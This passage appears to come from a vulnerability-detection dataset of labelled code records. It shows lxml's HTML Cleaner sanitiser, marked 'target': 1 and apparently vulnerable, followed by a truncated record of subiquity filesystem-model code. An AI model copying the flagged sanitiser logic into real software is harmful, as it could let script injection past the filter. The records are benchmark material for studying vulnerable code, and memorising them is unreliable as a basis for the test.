``links``:\n        Removes any ``<link>`` tags\n\n    ``meta``:\n        Removes any ``<meta>`` tags\n\n    ``page_structure``:\n        Structural parts of a page: ``<head>``, ``<html>``, ``<title>``.\n\n    ``processing_instructions``:\n        Removes any processing instructions.\n\n    ``embedded``:\n        Removes any embedded objects (flash, iframes)\n\n    ``frames``:\n        Removes any frame-related tags\n\n    ``forms``:\n        Removes any form tags\n\n    ``annoying_tags``:\n        Tags that aren't *wrong*, but are annoying.  ``<blink>`` and ``<marquee>``\n\n    ``remove_tags``:\n        A list of tags to remove.  Only the tags will be removed,\n        their content will get pulled up into the parent tag.\n\n    ``kill_tags``:\n        A list of tags to kill.  Killing also removes the tag's content,\n        i.e. the whole subtree, not just the tag itself.\n\n    ``allow_tags``:\n        A list of tags to include (default include all).\n\n    ``remove_unknown_tags``:\n        Remove any tags that aren't standard parts of HTML.\n\n    ``safe_attrs_only``:\n        If true, only include 'safe' attributes (specifically the list\n        from the feedparser HTML sanitisation web site).\n\n    ``safe_attrs``:\n        A set of attribute names to override the default list of attributes\n        considered 'safe' (when safe_attrs_only=True).\n\n    ``add_nofollow``:\n        If true, then any <a> tags will have ``rel=\"nofollow\"`` added to them.\n\n    ``host_whitelist``:\n        A list or set of hosts that you can use for embedded content\n        (for content like ``<object>``, ``<link rel=\"stylesheet\">``, etc).\n        You can also implement/override the method\n        ``allow_embedded_url(el, url)`` or ``allow_element(el)`` to\n        implement more complex rules for what can be embedded.\n        Anything that passes this test will be shown, regardless of\n        the value of (for instance) ``embedded``.\n\n        Note that this parameter might not work as intended if you do not\n        make the links absolute before doing the cleaning.\n\n        Note that you may also need to set ``whitelist_tags``.\n\n    ``whitelist_tags``:\n        A set of tags that can be included with ``host_whitelist``.\n        The default is ``iframe`` and ``embed``; you may wish to\n        include other tags like ``script``, or you may want to\n        implement ``allow_embedded_url`` for more control.  Set to None to\n        include all tags.\n\n    This modifies the document *in place*.\n    \"\"\"\n\n    scripts = True\n    javascript = True\n    comments = True\n    style = False\n    inline_style = None\n    links = True\n    meta = True\n    page_structure = True\n    processing_instructions = True\n    embedded = True\n    frames = True\n    forms = True\n    annoying_tags = True\n    remove_tags = None\n    allow_tags = None\n    kill_tags = None\n    remove_unknown_tags = True\n    safe_attrs_only = True\n    safe_attrs = defs.safe_attrs\n    add_nofollow = False\n    host_whitelist = ()\n    whitelist_tags = set(['iframe', 'embed'])\n\n    def __init__(self, **kw):\n        for name, value in kw.items():\n            if not hasattr(self, name):\n                raise TypeError(\n                    \"Unknown parameter: %s=%r\" % (name, value))\n            setattr(self, name, value)\n        if self.inline_style is None and 'inline_style' not in kw:\n            self.inline_style = self.style\n\n    # Used to lookup the primary URL for a given tag that is up for\n    # removal:\n    _tag_link_attrs = dict(\n        script='src',\n        link='href',\n        # From: http://java.sun.com/j2se/1.4.2/docs/guide/misc/applet.html\n        # From what I can tell, both attributes can contain a link:\n        applet=['code', 'object'],\n        iframe='src',\n        embed='src',\n        layer='src',\n        # FIXME: there doesn't really seem like a general way to figure out what\n        # links an <object> tag uses; links often go in <param> tags with values\n        # that we don't really know.  You'd have to have knowledge about specific\n        # kinds of plugins (probably keyed off classid), and match against those.\n        ##object=?,\n        # FIXME: not looking at the action currently, because it is more complex\n        # than than -- if you keep the form, you should keep the form controls.\n        ##form='action',\n        a='href',\n        )\n\n    def __call__(self, doc):\n        \"\"\"\n        Cleans the document.\n        \"\"\"\n        if hasattr(doc, 'getroot'):\n            # ElementTree instance, instead of an element\n            doc = doc.getroot()\n        # convert XHTML to HTML\n        xhtml_to_html(doc)\n        # Normalize a case that IE treats <image> like <img>, and that\n        # can confuse either this step or later steps.\n        for el in doc.iter('image'):\n            el.tag = 'img'\n        if not self.comments:\n            # Of course, if we were going to kill comments anyway, we don't\n            # need to worry about this\n            self.kill_conditional_comments(doc)\n\n        kill_tags = set(self.kill_tags or ())\n        remove_tags = set(self.remove_tags or ())\n        allow_tags = set(self.allow_tags or ())\n\n        if self.scripts:\n            kill_tags.add('script')\n        if self.safe_attrs_only:\n            safe_attrs = set(self.safe_attrs)\n            for el in doc.iter(etree.Element):\n                attrib = el.attrib\n                for aname in attrib.keys():\n                    if aname not in safe_attrs:\n                        del attrib[aname]\n        if self.javascript:\n            if not (self.safe_attrs_only and\n                    self.safe_attrs == defs.safe_attrs):\n                # safe_attrs handles events attributes itself\n                for el in doc.iter(etree.Element):\n                    attrib = el.attrib\n                    for aname in attrib.keys():\n                        if aname.startswith('on'):\n                            del attrib[aname]\n            doc.rewrite_links(self._remove_javascript_link,\n                              resolve_base_href=False)\n            # If we're deleting style then we don't have to remove JS links\n            # from styles, otherwise...\n            if not self.inline_style:\n                for el in _find_styled_elements(doc):\n                    old = el.get('style')\n                    new = _css_javascript_re.sub('', old)\n                    new = _css_import_re.sub('', new)\n                    if self._has_sneaky_javascript(new):\n                        # Something tricky is going on...\n                        del el.attrib['style']\n                    elif new != old:\n                        el.set('style', new)\n            if not self.style:\n                for el in list(doc.iter('style')):\n                    if el.get('type', '').lower().strip() == 'text/javascript':\n                        el.drop_tree()\n                        continue\n                    old = el.text or ''\n                    new = _css_javascript_re.sub('', old)\n                    # The imported CSS can do anything; we just can't allow:\n                    new = _css_import_re.sub('', old)\n                    if self._has_sneaky_javascript(new):\n                        # Something tricky is going on...\n                        el.text = '/* deleted */'\n                    elif new != old:\n                        el.text = new\n        if self.comments or self.processing_instructions:\n            # FIXME: why either?  I feel like there's some obscure reason\n            # because you can put PIs in comments...?  But I've already\n            # forgotten it\n            kill_tags.add(etree.Comment)\n        if self.processing_instructions:\n            kill_tags.add(etree.ProcessingInstruction)\n        if self.style:\n            kill_tags.add('style')\n        if self.inline_style:\n            etree.strip_attributes(doc, 'style')\n        if self.links:\n            kill_tags.add('link')\n        elif self.style or self.javascript:\n            # We must get rid of included stylesheets if Javascript is not\n            # allowed, as you can put Javascript in them\n            for el in list(doc.iter('link')):\n                if 'stylesheet' in el.get('rel', '').lower():\n                    # Note this kills alternate stylesheets as well\n                    if not self.allow_element(el):\n                        el.drop_tree()\n        if self.meta:\n            kill_tags.add('meta')\n        if self.page_structure:\n            remove_tags.update(('head', 'html', 'title'))\n        if self.embedded:\n            # FIXME: is <layer> really embedded?\n            # We should get rid of any <param> tags not inside <applet>;\n            # These are not really valid anyway.\n            for el in list(doc.iter('param')):\n                found_parent = False\n                parent = el.getparent()\n                while parent is not None and parent.tag not in ('applet', 'object'):\n                    parent = parent.getparent()\n                if parent is None:\n                    el.drop_tree()\n            kill_tags.update(('applet',))\n            # The alternate contents that are in an iframe are a good fallback:\n            remove_tags.update(('iframe', 'embed', 'layer', 'object', 'param'))\n        if self.frames:\n            # FIXME: ideally we should look at the frame links, but\n            # generally frames don't mix properly with an HTML\n            # fragment anyway.\n            kill_tags.update(defs.frame_tags)\n        if self.forms:\n            remove_tags.add('form')\n            kill_tags.update(('button', 'input', 'select', 'textarea'))\n        if self.annoying_tags:\n            remove_tags.update(('blink', 'marquee'))\n\n        _remove = []\n        _kill = []\n        for el in doc.iter():\n            if el.tag in kill_tags:\n                if self.allow_element(el):\n                    continue\n                _kill.append(el)\n            elif el.tag in remove_tags:\n                if self.allow_element(el):\n                    continue\n                _remove.append(el)\n\n        if _remove and _remove[0] == doc:\n            # We have to drop the parent-most tag, which we can't\n            # do.  Instead we'll rewrite it:\n            el = _remove.pop(0)\n            el.tag = 'div'\n            el.attrib.clear()\n        elif _kill and _kill[0] == doc:\n            # We have to drop the parent-most element, which we can't\n            # do.  Instead we'll clear it:\n            el = _kill.pop(0)\n            if el.tag != 'html':\n                el.tag = 'div'\n            el.clear()\n\n        _kill.reverse() # start with innermost tags\n        for el in _kill:\n            el.drop_tree()\n        for el in _remove:\n            el.drop_tag()\n\n        if self.remove_unknown_tags:\n            if allow_tags:\n                raise ValueError(\n                    \"It does not make sense to pass in both allow_tags and remove_unknown_tags\")\n            allow_tags = set(defs.tags)\n        if allow_tags:\n            bad = []\n            for el in doc.iter():\n                if el.tag not in allow_tags:\n                    bad.append(el)\n            if bad:\n                if bad[0] is doc:\n                    el = bad.pop(0)\n                    el.tag = 'div'\n                    el.attrib.clear()\n                for el in bad:\n                    el.drop_tag()\n        if self.add_nofollow:\n            for el in _find_external_links(doc):\n                if not self.allow_follow(el):\n                    rel = el.get('rel')\n                    if rel:\n                        if ('nofollow' in rel\n                                and ' nofollow ' in (' %s ' % rel)):\n                            continue\n                        rel = '%s nofollow' % rel\n                    else:\n                        rel = 'nofollow'\n                    el.set('rel', rel)\n\n    def allow_follow(self, anchor):\n        \"\"\"\n        Override to suppress rel=\"nofollow\" on some anchors.\n        \"\"\"\n        return False\n\n    def allow_element(self, el):\n        if el.tag not in self._tag_link_attrs:\n            return False\n        attr = self._tag_link_attrs[el.tag]\n        if isinstance(attr, (list, tuple)):\n            for one_attr in attr:\n                url = el.get(one_attr)\n                if not url:\n                    return False\n                if not self.allow_embedded_url(el, url):\n                    return False\n            return True\n        else:\n            url = el.get(attr)\n            if not url:\n                return False\n            return self.allow_embedded_url(el, url)\n\n    def allow_embedded_url(self, el, url):\n        if (self.whitelist_tags is not None\n            and el.tag not in self.whitelist_tags):\n            return False\n        scheme, netloc, path, query, fragment = urlsplit(url)\n        netloc = netloc.lower().split(':', 1)[0]\n        if scheme not in ('http', 'https'):\n            return False\n        if netloc in self.host_whitelist:\n            return True\n        return False\n\n    def kill_conditional_comments(self, doc):\n        \"\"\"\n        IE conditional comments basically embed HTML that the parser\n        doesn't normally see.  We can't allow anything like that, so\n        we'll kill any comments that could be conditional.\n        \"\"\"\n        bad = []\n        self._kill_elements(\n            doc, lambda el: _conditional_comment_re.search(el.text),\n            etree.Comment)                \n\n    def _kill_elements(self, doc, condition, iterate=None):\n        bad = []\n        for el in doc.iter(iterate):\n            if condition(el):\n                bad.append(el)\n        for el in bad:\n            el.drop_tree()\n\n    def _remove_javascript_link(self, link):\n        # links like \"j a v a s c r i p t:\" might be interpreted in IE\n        new = _substitute_whitespace('', link)\n        if _is_javascript_scheme(new):\n            # FIXME: should this be None to delete?\n            return ''\n        return link\n\n    _substitute_comments = re.compile(r'/\\*.*?\\*/', re.S).sub\n\n    def _has_sneaky_javascript(self, style):\n        \"\"\"\n        Depending on the browser, stuff like ``e x p r e s s i o n(...)``\n        can get interpreted, or ``expre/* stuff */ssion(...)``.  This\n        checks for attempt to do stuff like this.\n\n        Typically the response will be to kill the entire style; if you\n        have just a bit of Javascript in the style another rule will catch\n        that and remove only the Javascript from the style; this catches\n        more sneaky attempts.\n        \"\"\"\n        style = self._substitute_comments('', style)\n        style = style.replace('\\\\', '')\n        style = _substitute_whitespace('', style)\n        style = style.lower()\n        if 'javascript:' in style:\n            return True\n        if 'expression(' in style:\n            return True\n        return False\n\n    def clean_html(self, html):\n        result_type = type(html)\n        if isinstance(html, basestring):\n            doc = fromstring(html)\n        else:\n            doc = copy.deepcopy(html)\n        self(doc)\n        return _transform_result(result_type, doc)\n\nclean = Cleaner()\nclean_html = clean.clean_html\n\n############################################################\n## Autolinking\n############################################################\n\n_link_regexes = [\n    re.compile(r'(?P<body>https?://(?P<host>[a-z0-9._-]+)(?:/[/\\-_.,a-z0-9%&?;=~]*)?(?:\\([/\\-_.,a-z0-9%&?;=~]*\\))?)', re.I),\n    # This is conservative, but autolinking can be a bit conservative:\n    re.compile(r'mailto:(?P<body>[a-z0-9._-]+@(?P<host>[a-z0-9_.-]+[a-z]))', re.I),\n    ]\n\n_avoid_elements = ['textarea', 'pre', 'code', 'head', 'select', 'a']\n\n_avoid_hosts = [\n    re.compile(r'^localhost', re.I),\n    re.compile(r'\\bexample\\.(?:com|org|net)$', re.I),\n    re.compile(r'^127\\.0\\.0\\.1$'),\n    ]\n\n_avoid_classes = ['nolink']\n\ndef autolink(el, link_regexes=_link_regexes,\n             avoid_elements=_avoid_elements,\n             avoid_hosts=_avoid_hosts,\n             avoid_classes=_avoid_classes):\n    \"\"\"\n    Turn any URLs into links.\n\n    It will search for links identified by the given regular\n    expressions (by default mailto and http(s) links).\n\n    It won't link text in an element in avoid_elements, or an element\n    with a class in avoid_classes.  It won't link to anything with a\n    host that matches one of the regular expressions in avoid_hosts\n    (default localhost and 127.0.0.1).\n\n    If you pass in an element, the element's tail will not be\n    substituted, only the contents of the element.\n    \"\"\"\n    if el.tag in avoid_elements:\n        return\n    class_name = el.get('class')\n    if class_name:\n        class_name = class_name.split()\n        for match_class in avoid_classes:\n            if match_class in class_name:\n                return\n    for child in list(el):\n        autolink(child, link_regexes=link_regexes,\n                 avoid_elements=avoid_elements,\n                 avoid_hosts=avoid_hosts,\n                 avoid_classes=avoid_classes)\n        if child.tail:\n            text, tail_children = _link_text(\n                child.tail, link_regexes, avoid_hosts, factory=el.makeelement)\n            if tail_children:\n                child.tail = text\n                index = el.index(child)\n                el[index+1:index+1] = tail_children\n    if el.text:\n        text, pre_children = _link_text(\n            el.text, link_regexes, avoid_hosts, factory=el.makeelement)\n        if pre_children:\n            el.text = text\n            el[:0] = pre_children\n\ndef _link_text(text, link_regexes, avoid_hosts, factory):\n    leading_text = ''\n    links = []\n    last_pos = 0\n    while 1:\n        best_match, best_pos = None, None\n        for regex in link_regexes:\n            regex_pos = last_pos\n            while 1:\n                match = regex.search(text, pos=regex_pos)\n                if match is None:\n                    break\n                host = match.group('host')\n                for host_regex in avoid_hosts:\n                    if host_regex.search(host):\n                        regex_pos = match.end()\n                        break\n                else:\n                    break\n            if match is None:\n                continue\n            if best_pos is None or match.start() < best_pos:\n                best_match = match\n                best_pos = match.start()\n        if best_match is None:\n            # No more matches\n            if links:\n                assert not links[-1].tail\n                links[-1].tail = text\n            else:\n                assert not leading_text\n                leading_text = text\n            break\n        link = best_match.group(0)\n        end = best_match.end()\n        if link.endswith('.') or link.endswith(','):\n            # These punctuation marks shouldn't end a link\n            end -= 1\n            link = link[:-1]\n        prev_text = text[:best_match.start()]\n        if links:\n            assert not links[-1].tail\n            links[-1].tail = prev_text\n        else:\n            assert not leading_text\n            leading_text = prev_text\n        anchor = factory('a')\n        anchor.set('href', link)\n        body = best_match.group('body')\n        if not body:\n            body = link\n        if body.endswith('.') or body.endswith(','):\n            body = body[:-1]\n        anchor.text = body\n        links.append(anchor)\n        text = text[end:]\n    return leading_text, links\n                \ndef autolink_html(html, *args, **kw):\n    result_type = type(html)\n    if isinstance(html, basestring):\n        doc = fromstring(html)\n    else:\n        doc = copy.deepcopy(html)\n    autolink(doc, *args, **kw)\n    return _transform_result(result_type, doc)\n\nautolink_html.__doc__ = autolink.__doc__\n\n############################################################\n## Word wrapping\n############################################################\n\n_avoid_word_break_elements = ['pre', 'textarea', 'code']\n_avoid_word_break_classes = ['nobreak']\n\ndef word_break(el, max_width=40,\n               avoid_elements=_avoid_word_break_elements,\n               avoid_classes=_avoid_word_break_classes,\n               break_character=unichr(0x200b)):\n    \"\"\"\n    Breaks any long words found in the body of the text (not attributes).\n\n    Doesn't effect any of the tags in avoid_elements, by default\n    ``<textarea>`` and ``<pre>``\n\n    Breaks words by inserting &#8203;, which is a unicode character\n    for Zero Width Space character.  This generally takes up no space\n    in rendering, but does copy as a space, and in monospace contexts\n    usually takes up space.\n\n    See http://www.cs.tut.fi/~jkorpela/html/nobr.html for a discussion\n    \"\"\"\n    # Character suggestion of &#8203 comes from:\n    #   http://www.cs.tut.fi/~jkorpela/html/nobr.html\n    if el.tag in _avoid_word_break_elements:\n        return\n    class_name = el.get('class')\n    if class_name:\n        dont_break = False\n        class_name = class_name.split()\n        for avoid in avoid_classes:\n            if avoid in class_name:\n                dont_break = True\n                break\n        if dont_break:\n            return\n    if el.text:\n        el.text = _break_text(el.text, max_width, break_character)\n    for child in el:\n        word_break(child, max_width=max_width,\n                   avoid_elements=avoid_elements,\n                   avoid_classes=avoid_classes,\n                   break_character=break_character)\n        if child.tail:\n            child.tail = _break_text(child.tail, max_width, break_character)\n\ndef word_break_html(html, *args, **kw):\n    result_type = type(html)\n    doc = fromstring(html)\n    word_break(doc, *args, **kw)\n    return _transform_result(result_type, doc)\n\ndef _break_text(text, max_width, break_character):\n    words = text.split()\n    for word in words:\n        if len(word) > max_width:\n            replacement = _insert_break(word, max_width, break_character)\n            text = text.replace(word, replacement)\n    return text\n\n_break_prefer_re = re.compile(r'[^a-z]', re.I)\n\ndef _insert_break(word, width, break_character):\n    orig_word = word\n    result = ''\n    while len(word) > width:\n        start = word[:width]\n        breaks = list(_break_prefer_re.finditer(start))\n        if breaks:\n            last_break = breaks[-1]\n            # Only walk back up to 10 characters to find a nice break:\n            if last_break.end() > width-10:\n                # FIXME: should the break character be at the end of the\n                # chunk, or the beginning of the next chunk?\n                start = word[:last_break.end()]\n        result += start + break_character\n        word = word[len(start):]\n    result += word\n    return result\n    \n", "target": 1}
{"idx": 1041, "func": "# Copyright 2015 Canonical, Ltd.\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU Affero General Public License as\n# published by the Free Software Foundation, either version 3 of the\n# License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Affero General Public License for more details.\n#\n# You should have received a copy of the GNU Affero General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nfrom abc import ABC, abstractmethod\nimport attr\nimport collections\nimport enum\nimport fnmatch\nimport itertools\nimport logging\nimport math\nimport os\nimport pathlib\nimport platform\n\nfrom curtin import storage_config\nfrom curtin.util import human2bytes\n\nfrom probert.storage import StorageInfo\n\nlog = logging.getLogger('subiquity.models.filesystem')\n\n\ndef _set_backlinks(obj):\n    for field in attr.fields(type(obj)):\n        backlink = field.metadata.get('backlink')\n        if backlink is None:\n            continue\n        v = getattr(obj, field.name)\n        if v is None:\n            continue\n        if not isinstance(v, (list, set)):\n            v = [v]\n        for vv in v:\n            b = getattr(vv, backlink, None)\n            if isinstance(b, list):\n                b.append(obj)\n            elif isinstance(b, set):\n                b.add(obj)\n            else:\n                setattr(vv, backlink, obj)\n\n\ndef _remove_backlinks(obj):\n    for field in attr.fields(type(obj)):\n        backlink = field.metadata.get('backlink')\n        if backlink is None:\n            continue\n        v = getattr(obj, field.name)\n        if v is None:\n            continue\n        if not isinstance(v, (list, set)):\n            v = [v]\n        for vv in v:\n            b = getattr(vv, backlink, None)\n            if isinstance(b, list):\n                b.remove(obj)\n            elif isinstance(b, set):\n                b.remove(obj)\n            else:\n                setattr(vv, backlink, None)\n\n\n_type_to_cls = {}\n\n\ndef fsobj__repr(obj):\n    args = []\n    for f in attr.fields(type(obj)):\n        if f.name.startswith(\"_\"):\n            continue\n        v = getattr(obj, f.name)\n        if v is f.default:\n            continue\n        if f.metadata.get('ref', False):\n            v = v.id\n        elif f.metadata.get('reflist', False):\n            if isinstance(v, set):\n                delims = \"{}\"\n            else:\n                delims = \"[]\"\n            v = delims[0] + \", \".join(vv.id for vv in v) + delims[1]\n        elif f.metadata.get('redact', False):\n            v = \"<REDACTED>\"\n        else:\n            v = repr(v)\n        args.append(\"{}={}\".format(f.name, v))\n    return \"{}({})\".format(type(obj).__name__, \", \".join(args))\n\n\ndef fsobj(typ):\n    def wrapper(c):\n        c.__attrs_post_init__ = _set_backlinks\n        c.type = attributes.const(typ)\n        c.id = attributes.idfield(typ)\n        c._m = attr.ib(repr=None, default=None)\n        c = attr.s(cmp=False, repr=False)(c)\n        c.__repr__ = fsobj__repr\n        _type_to_cls[typ] = c\n        return c\n    return wrapper\n\n\ndef dependencies(obj):\n    for f in attr.fields(type(obj)):\n        v = getattr(obj, f.name)\n        if not v:\n            continue\n        elif f.metadata.get('ref', False):\n            yield v\n        elif f.metadata.get('reflist', False):\n            yield from v\n\n\ndef reverse_dependencies(obj):\n    for f in attr.fields(type(obj)):\n        if not f.metadata.get('is_backlink', False):\n            continue\n        v = getattr(obj, f.name)\n        if isinstance(v, (list, set)):\n            yield from v\n        elif v is not None:\n            yield v\n\n\n@attr.s(cmp=False)\nclass RaidLevel:\n    name = attr.ib()\n    value = attr.ib()\n    min_devices = attr.ib()\n    supports_spares = attr.ib(default=True)\n\n\nraidlevels = [\n    RaidLevel(_(\"0 (striped)\"),  \"raid0\",  2, False),\n    RaidLevel(_(\"1 (mirrored)\"), \"raid1\",  2),\n    RaidLevel(_(\"5\"),            \"raid5\",  3),\n    RaidLevel(_(\"6\"),            \"raid6\",  4),\n    RaidLevel(_(\"10\"),           \"raid10\", 4),\n    ]\n\n\ndef _raidlevels_by_value():\n    r = {level.value: level for level in raidlevels}\n    for n in 0, 1, 5, 6, 10:\n        r[str(n)] = r[n] = r[\"raid\"+str(n)]\n    r[\"stripe\"] = r[\"raid0\"]\n    r[\"mirror\"] = r[\"raid1\"]\n    return r\n\n\nraidlevels_by_value = _raidlevels_by_value()\n\nHUMAN_UNITS = ['B', 'K', 'M', 'G', 'T', 'P']\n\n\ndef humanize_size(size):\n    if size == 0:\n        return \"0B\"\n    p = int(math.floor(math.log(size, 2) / 10))\n    # We want to truncate the non-integral part, not round to nearest.\n    s = \"{:.17f}\".format(size / 2 ** (10 * p))\n    i = s.index('.')\n    s = s[:i + 4]\n    return s + HUMAN_UNITS[int(p)]\n\n\ndef dehumanize_size(size):\n    # convert human 'size' to integer\n    size_in = size\n\n    if not size:\n        raise ValueError(\"input cannot be empty\")\n\n    if not size[-1].isdigit():\n        suffix = size[-1].upper()\n        size = size[:-1]\n    else:\n        suffix = None\n\n    parts = size.split('.')\n    if len(parts) > 2:\n        raise ValueError(_(\"{!r} is not valid input\").format(size_in))\n    elif len(parts) == 2:\n        div = 10 ** len(parts[1])\n        size = parts[0] + parts[1]\n    else:\n        div = 1\n\n    try:\n        num = int(size)\n    except ValueError:\n        raise ValueError(_(\"{!r} is not valid input\").format(size_in))\n\n    if suffix is not None:\n        if suffix not in HUMAN_UNITS:\n            raise ValueError(\n                \"unrecognized suffix {!r} in {!r}\".format(size_in[-1],\n                                                          size_in))\n        mult = 2 ** (10 * HUMAN_UNITS.index(suffix))\n    else:\n        mult = 1\n\n    if num < 0:\n        raise ValueError(\"{!r}: cannot be negative\".format(size_in))\n\n    return num * mult // div\n\n\nDEFAULT_CHUNK = 512\n\n\n# The calculation of how much of a device mdadm uses for raid is more than a\n# touch ridiculous. What follows is a translation of the code at:\n# https://git.kernel.org/pub/scm/utils/mdadm/mdadm.git/tree/super1.c,\n# specifically choose_bm_space and the end of validate_geometry1. Note that\n# that calculations are in terms of 512-byte sectors.\n#\n# We make some assumptions about the defaults mdadm uses but mostly that the\n# default metadata version is 1.2, and other formats use less space.\n#\n# Note that data_offset is computed for the first disk mdadm examines and then\n# used for all devices, so the order matters! (Well, if the size of the\n# devices vary, which is not normal but also not something we prevent).\n#\n# All this is tested against reality in ./scripts/get-raid-sizes.py\ndef calculate_data_offset_bytes(devsize):\n    # Convert to sectors to make it easier to compare this code to mdadm's (we\n    # convert back at the end)\n    devsize >>= 9\n\n    devsize = align_down(devsize, DEFAULT_CHUNK)\n\n    # conversion of choose_bm_space:\n    if devsize < 64*2:\n        bmspace = 0\n    elif devsize - 64*2 >= 200*1024*1024*2:\n        bmspace = 128*2\n    elif devsize - 4*2 > 8*1024*1024*2:\n        bmspace = 64*2\n    else:\n        bmspace = 4*2\n\n    # From the end of validate_geometry1, assuming metadata 1.2.\n    headroom = 128*1024*2\n    while (headroom << 10) > devsize and headroom / 2 >= DEFAULT_CHUNK*2*2:\n        headroom >>= 1\n\n    data_offset = 12*2 + bmspace + headroom\n    log.debug(\n        \"get_raid_size: adjusting for %s sectors of overhead\", data_offset)\n    data_offset = align_up(data_offset, 2*1024)\n\n    # convert back to bytes\n    return data_offset << 9\n\n\ndef raid_device_sort(devices):\n    # Because the device order matters to mdadm, we sort consistently but\n    # arbitrarily when computing the size and when rendering the config (so\n    # curtin passes the devices to mdadm in the order we calculate the size\n    # for)\n    return sorted(devices, key=lambda d: d.id)\n\n\ndef get_raid_size(level, devices):\n    if len(devices) == 0:\n        return 0\n    devices = raid_device_sort(devices)\n    data_offset = calculate_data_offset_bytes(devices[0].size)\n    sizes = [align_down(dev.size - data_offset) for dev in devices]\n    min_size = min(sizes)\n    if min_size <= 0:\n        return 0\n    if level == \"raid0\":\n        return sum(sizes)\n    elif level == \"raid1\":\n        return min_size\n    elif level == \"raid5\":\n        return min_size * (len(devices) - 1)\n    elif level == \"raid6\":\n        return min_size * (len(devices) - 2)\n    elif level == \"raid10\":\n        return min_size * (len(devices) // 2)\n    else:\n        raise ValueError(\"unknown raid level %s\" % level)\n\n\n# These are only defaults but curtin does not let you change/specify\n# them at this time.\nLVM_OVERHEAD = (1 << 20)\nLVM_CHUNK_SIZE = 4 * (1 << 20)\n\n\ndef get_lvm_size(devices, size_overrides={}):\n    r = 0\n    for d in devices:\n        r += align_down(\n            size_overrides.get(d, d.size) - LVM_OVERHEAD,\n            LVM_CHUNK_SIZE)\n    return r\n\n\ndef _conv_size(s):\n    if isinstance(s, str):\n        if '%' in s:\n            return s\n        return int(human2bytes(s))\n    return s\n\n\nclass attributes:\n    # Just a namespace to hang our wrappers around attr.ib() off.\n\n    @staticmethod\n    def idfield(base):\n        i = 0\n\n        def factory():\n            nonlocal i\n            r = \"%s-%s\" % (base, i)\n            i += 1\n            return r\n        return attr.ib(default=attr.Factory(factory))\n\n    @staticmethod\n    def ref(*, backlink=None):\n        metadata = {'ref': True}\n        if backlink:\n            metadata['backlink'] = backlink\n        return attr.ib(metadata=metadata)\n\n    @staticmethod\n    def reflist(*, backlink=None, default=attr.NOTHING):\n        metadata = {'reflist': True}\n        if backlink:\n            metadata['backlink'] = backlink\n        return attr.ib(metadata=metadata, default=default)\n\n    @staticmethod\n    def backlink(*, default=None):\n        return attr.ib(\n            init=False, default=default, metadata={'is_backlink': True})\n\n    @staticmethod\n    def const(value):\n        return attr.ib(default=value)\n\n    @staticmethod\n    def size():\n        return attr.ib(converter=_conv_size)\n\n    @staticmethod\n    def ptable():\n\n        def conv(val):\n            if val == \"dos\":\n                val = \"msdos\"\n            return val\n        return attr.ib(default=None, converter=conv)\n\n\ndef asdict(inst):\n    r = collections.OrderedDict()\n    for field in attr.fields(type(inst)):\n        if field.name.startswith('_'):\n            continue\n        m = getattr(inst, 'serialize_' + field.name, None)\n        if m:\n            r.update(m())\n        else:\n            v = getattr(inst, field.name)\n            if v is not None:\n                if field.metadata.get('ref', False):\n                    r[field.name] = v.id\n                elif field.metadata.get('reflist', False):\n                    r[field.name] = [elem.id for elem in v]\n                else:\n                    r[field.name] = v\n    return r\n\n\n# This code is not going to make much sense unless you have read\n# http://curtin.readthedocs.io/en/latest/topics/storage.html. The\n# Disk, Partition etc classes correspond to entries in curtin's\n# storage config list. They are mostly 'dumb data', all the logic is\n# in the FilesystemModel or FilesystemController classes.\n\n\nclass DeviceAction(enum.Enum):\n    INFO = _(\"Info\")\n    EDIT = _(\"Edit\")\n    REFORMAT = _(\"Reformat\")\n    PARTITION = _(\"Add Partition\")\n    CREATE_LV = _(\"Create Logical Volume\")\n    FORMAT = _(\"Format\")\n    REMOVE = _(\"Remove from RAID/LVM\")\n    DELETE = _(\"Delete\")\n    TOGGLE_BOOT = _(\"Make Boot Device\")\n\n\ndef _generic_can_EDIT(obj):\n    cd = obj.constructed_device()\n    if cd is None:\n        return True\n    return _(\n        \"Cannot edit {selflabel} as it is part of the {cdtype} \"\n        \"{cdname}.\").format(\n            selflabel=obj.label,\n            cdtype=cd.desc(),\n            cdname=cd.label)\n\n\ndef _generic_can_REMOVE(obj):\n    cd = obj.constructed_device()\n    if cd is None:\n        return False\n    if cd.preserve:\n        return _(\"Cannot remove {selflabel} from pre-existing {cdtype} \"\n                 \"{cdlabel}.\").format(\n                    selflabel=obj.label,\n                    cdtype=cd.desc(),\n                    cdlabel=cd.label)\n    if isinstance(cd, Raid):\n        if obj in cd.spare_devices:\n            return True\n        min_devices = raidlevels_by_value[cd.raidlevel].min_devices\n        if len(cd.devices) == min_devices:\n            return _(\n                \"Removing {selflabel} would leave the {cdtype} {cdlabel} with \"\n                \"less than {min_devices} devices.\").format(\n                    selflabel=obj.label,\n                    cdtype=cd.desc(),\n                    cdlabel=cd.label,\n                    min_devices=min_devices)\n    elif isinstance(cd, LVM_VolGroup):\n        if len(cd.devices) == 1:\n            return _(\n                \"Removing {selflabel} would leave the {cdtype} {cdlabel} with \"\n                \"no devices.\").format(\n                    selflabel=obj.label,\n                    cdtype=cd.desc(),\n                    cdlabel=cd.label)\n    return True\n\n\ndef _generic_can_DELETE(obj):\n    cd = obj.constructed_device()\n    if cd is None:\n        return True\n    return _(\n        \"Cannot delete {selflabel} as it is part of the {cdtype} \"\n        \"{cdname}.\").format(\n            selflabel=obj.label,\n            cdtype=cd.desc(),\n            cdname=cd.label)\n\n\n@attr.s(cmp=False)\nclass _Formattable(ABC):\n    # Base class for anything that can be formatted and mounted,\n    # e.g. a disk or a RAID or a partition.\n\n    @property\n    @abstractmethod\n    def label(self):\n        pass\n\n    @property\n    def annotations(self):\n        preserve = getattr(self, 'preserve', None)\n        if preserve is None:\n            return []\n        elif preserve:\n            return [_(\"existing\")]\n        else:\n            return [_(\"new\")]\n\n    # Filesystem\n    _fs = attributes.backlink()\n    # Raid or LVM_VolGroup for now, but one day ZPool, BCache...\n    _constructed_device = attributes.backlink()\n\n    def usage_labels(self):\n        cd = self.constructed_device()\n        if cd is not None:\n            return [\n                _(\"{component_name} of {desc} {name}\").format(\n                    component_name=cd.component_name,\n                    desc=cd.desc(),\n                    name=cd.name),\n                ]\n        fs = self.fs()\n        if fs is not None:\n            if fs.preserve:\n                format_desc = _(\"already formatted as {fstype}\")\n            elif 